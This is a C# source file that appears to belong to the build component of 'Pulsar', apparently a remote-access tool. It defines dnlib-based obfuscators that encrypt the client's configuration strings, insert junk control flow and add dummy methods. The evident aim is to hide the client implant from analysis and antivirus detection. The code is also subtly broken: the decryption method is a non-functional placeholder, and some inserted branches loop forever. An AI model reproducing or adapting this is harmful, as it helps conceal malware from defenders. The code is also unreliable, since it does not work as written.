using dnlib.DotNet;
using dnlib.DotNet.Emit;
using System;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Text;
using System.Linq;
using System.IO;

namespace Pulsar.Server.Build.Obfuscator.Transformers
{
    public interface ITransformer
    {
        void Transform(Obfuscator obfuscator);
    }

    public class AdvancedStringEncryptionTransformer : ITransformer
    {
        private static Random random = new Random();
        private readonly string decryptionMethodName = "DecryptString_" + Guid.NewGuid().ToString().Replace("-", "");

        public void Transform(Obfuscator obfuscator)
        {
            ModuleDefMD module = obfuscator.Module;
            TypeDef decryptType = null;

            // Find target type for decryption method
            foreach (var type in module.Types)
            {
                if (type.FullName == "Pulsar.Client.Config.Settings")
                {
                    decryptType = type;
                    break;
                }
            }

            // Add placeholder decryption method
            if (decryptType != null)
            {
                var decryptMethod = new MethodDefUser(
                    decryptionMethodName,
                    MethodSig.CreateStatic(module.CorLibTypes.String, module.CorLibTypes.String, module.CorLibTypes.String),
                    MethodImplAttributes.IL | MethodImplAttributes.Managed,
                    MethodAttributes.Public | MethodAttributes.Static
                );
                decryptMethod.Body = new CilBody();
                decryptMethod.Body.Instructions.Add(OpCodes.Ldstr.ToInstruction("Not implemented")); // Placeholder
                decryptType.Methods.Add(decryptMethod);
            }

            // Encrypt string literals
            foreach (var type in module.GetTypes())
            {
                foreach (var method in type.Methods.Where(m => m.HasBody))
                {
                    var instructions = method.Body.Instructions;

                    for (int i = 0; i < instructions.Count; i++)
                    {
                        if (instructions[i].OpCode == OpCodes.Ldstr && instructions[i].Operand is string str)
                        {
                            string key = "PulsarKey_" + random.Next(1000, 9999);
                            string encrypted = EncryptString(str, key);

                            instructions[i].Operand = encrypted;

                            if (decryptType != null)
                            {
                                instructions.Insert(i + 1, OpCodes.Ldstr.ToInstruction(key));
                                instructions.Insert(i + 2, OpCodes.Call.ToInstruction(decryptType.FindMethod(decryptionMethodName)));
                            }
                        }
                    }

                    method.Body.SimplifyBranches();
                }
            }
        }

        private string EncryptString(string plainText, string key)
        {
            try
            {
                byte[] iv = new byte[16];
                random.NextBytes(iv);

                using (Aes aes = Aes.Create())
                {
                    aes.Key = Encoding.UTF8.GetBytes(key.PadRight(32, '\0'));
                    aes.IV = iv;

                    using (MemoryStream ms = new MemoryStream())
                    {
                        ms.Write(iv, 0, iv.Length);

                        using (CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
                        using (StreamWriter sw = new StreamWriter(cs))
                        {
                            sw.Write(plainText);
                        }

                        return Convert.ToBase64String(ms.ToArray());
                    }
                }
            }
            catch
            {
                return plainText;
            }
        }
    }

    public class ControlFlowTransformer : ITransformer
    {
        private static Random random = new Random();

        public void Transform(Obfuscator obfuscator)
        {
            foreach (var type in obfuscator.Module.GetTypes())
            {
                foreach (var method in type.Methods.Where(m => m.HasBody))
                {
                    var instructions = method.Body.Instructions;
                    var newInstructions = new List<Instruction>();

                    foreach (var instr in instructions)
                    {
                        newInstructions.Add(instr);

                        if (random.Next(0, 100) < 20) // 20% chance to add junk
                        {
                            var nop = OpCodes.Nop.ToInstruction();
                            newInstructions.Add(nop);

                            if (random.Next(0, 100) < 50)
                            {
                                var br = OpCodes.Br_S.ToInstruction(nop);
                                newInstructions.Add(br);
                            }
                        }
                    }

                    instructions.Clear();
                    instructions.AddRange(newInstructions);

                    method.Body.SimplifyBranches();
                    method.Body.OptimizeBranches();
                }
            }
        }
    }

    public class DummyCodeTransformer : ITransformer
    {
        private static Random random = new Random();

        public void Transform(Obfuscator obfuscator)
        {
            var module = obfuscator.Module;
            var dummyType = new TypeDefUser("Dummy" + Guid.NewGuid().ToString(), module.CorLibTypes.Object.TypeDefOrRef);
            module.Types.Add(dummyType);

            for (int i = 0; i < 5; i++)
            {
                var dummyMethod = new MethodDefUser(
                    "DummyMethod_" + random.Next(1000, 9999),
                    MethodSig.CreateStatic(module.CorLibTypes.Void),
                    MethodImplAttributes.IL | MethodImplAttributes.Managed,
                    MethodAttributes.Public | MethodAttributes.Static
                );

                dummyMethod.Body = new CilBody();

                for (int j = 0; j < random.Next(5, 15); j++)
                {
                    dummyMethod.Body.Instructions.Add(OpCodes.Nop.ToInstruction());
                }

                dummyMethod.Body.Instructions.Add(OpCodes.Ret.ToInstruction());
                dummyType.Methods.Add(dummyMethod);
            }
        }
    }
}
